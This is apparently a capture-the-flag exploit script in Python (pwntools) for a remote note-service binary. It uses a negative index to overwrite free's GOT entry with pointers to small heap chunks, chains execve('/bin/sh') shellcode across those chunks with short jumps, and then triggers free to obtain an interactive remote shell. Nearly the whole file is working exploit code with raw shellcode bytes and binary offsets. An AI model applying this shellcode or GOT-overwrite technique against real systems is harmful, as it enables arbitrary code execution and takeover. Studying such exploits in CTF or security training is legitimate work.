from pwn import *


def add(index, content, size=0):
    size = size if size else len(content)
    io.recvuntil('>>')
    io.sendline('1')
    io.recvuntil('index:')
    io.sendline(str(index))
    io.recvuntil('size')
    io.sendline(str(size))
    io.recvuntil('content:')
    io.sendline(content)

def delete(index):
    io.recvuntil('>>')
    io.sendline('4')
    io.recvuntil('index:')
    io.sendline(str(index))

def realaddr():
    f = open('/proc/' + str(pwnlib.util.proc.pidof(io)[0]) + '/maps')
    s = f.read(100)
    base = int(s[0:s.find('-')], 16)

    add = hex(add_ofst + base)
    print("base:       ", hex(base))
    print("add:        ", hex(add_ofst + base))
    print("del:        ", hex(del_ofst + base))
    print("get_choice: ", hex(get_choice_ofst + base))
    print("free_got_offset: ", hex(free_got_offset + base))
    print("g_count_ofst: ", hex(g_count_ofst + base))
    print("g_array_offset: ", hex(g_array_ofst + base))
    return [hex(add_ofst + base), hex(del_ofst + base), hex(get_choice_ofst + base), hex(loop_ofst + base), hex(free_got_offset + base)]


def debug():
    addrs = realaddr()
    breakpoit_str = ""
    for addr in  addrs:
        breakpoit_str += ("b* " + str(addr) + "\n")
    gdb.attach(io, breakpoit_str)


add_ofst = 0x0000000000000CA5
del_ofst = 0x0000000000000DE7
loop_ofst = 0x0000000000000E38
get_choice_ofst = 0x0000000000000E58
free_got_offset = 0x0000000000202018
g_count_ofst = 0x000000000020209C
g_array_ofst = 0x00000000002020A0

#io = process('./task_note_service2_OG37AWm')
io = remote("49.4.23.11", 32711)
elf = ELF('./task_note_service2_OG37AWm')


scc = ['\xf7\xe6P\xeb\x19', '\xb0;\x0f\x05']
# add(0, 'aaa')
# add(0, 'bbb')

# scs = ['H1\xc0WH1\xff\xeb\x19',\
#         'H\x89\xc6_\xeb\x19', \
#         'H\x83\xc7e\xb0;\xeb\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x0f\x05$0;\x00'

add(0, 'aaa')
delete(0)

add(-17, 'H1\xc0PZ\xeb\x19', 8)
add(0, '\x90\x90\x90\x90P\xeb\x19', 8)
add(0, '^\xb0;\x0f\x05', 8)
add(0, '/bin/sh', 8)
#debug()
#gdb.attach(io)
raw_input()
delete(0)
io.interactive()